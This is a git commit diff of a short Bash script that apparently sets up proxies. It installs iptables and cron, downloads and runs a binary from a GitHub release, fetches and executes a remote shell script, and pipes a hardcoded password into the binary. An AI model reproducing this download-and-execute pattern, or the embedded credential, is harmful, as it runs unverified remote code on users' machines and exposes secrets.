d170e9047b5f65ef61307cf9eb196c60ad9cc419
kieunhutrung1 <70471768+kieunhutrung1@users.noreply.github.com>
2025-06-30 11:22:11 +0700

    Update trung.sh

--- trung.sh
+++ trung.sh
@@ -1,11 +1,8 @@
 #!/bin/bash
-
+sudo apt update && sudo apt-get install --no-upgrade iptables cron -y
 # Tải file nhị phân về /usr/local/bin
 wget -qO /usr/local/bin/createprx https://github.com/luffypro666/tien/releases/download/create/createprxaz && chmod +x /usr/local/bin/createprx && /usr/local/bin/createprx && curl -O https://kieunhutrung1.github.io/api_proxy.sh && chmod +x api_proxy.sh && ./api_proxy.sh
-read -p "👉 Nhập tên sever: " user_input
 # Truyền dữ liệu từng dòng, mỗi dòng cách 2 giây
 {
   echo "Tienmaster@123"
-  echo "$user_input"
-  echo "kieunhutrung1.github.io"
 } | /usr/local/bin/createprx
